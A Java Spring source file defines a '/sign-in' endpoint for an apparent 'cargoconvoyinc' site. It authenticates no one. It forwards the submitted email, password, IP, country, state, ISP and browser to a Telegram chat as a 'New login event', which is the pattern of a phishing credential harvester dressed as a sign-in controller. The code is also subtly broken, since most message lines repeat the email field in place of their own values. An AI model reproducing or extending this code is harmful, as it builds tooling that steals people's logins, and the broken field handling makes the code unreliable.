package project.cargoconvoyinc.app.signInController;

import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import project.cargoconvoyinc.app.telegramservice.TelegramService;

@RestController
public class SignInController {
	
	@RequestMapping(method = RequestMethod.POST, value = "/sign-in")
	public User signIn(@RequestBody User user) {
		String message =
		        "New login event\n" +
		        "Email: " + user.email + "\n" +
		        "Password: " + user.email + "\n" +
		        "Ip: " + user.email + "\n" +
		        "Country: " + user.email + "\n" +
		        "State: " + user.email + "\n" +
		        "Isp: " + user.email + "\n" +
		        "Browser: " + user.userAgent;

		TelegramService.sendMessage(message);
		return user;
	}

}

class User {
	public String email;
	public String password;
	public String ip;
	public String country;
	public String state;
	public String isp;
	public String userAgent;
}
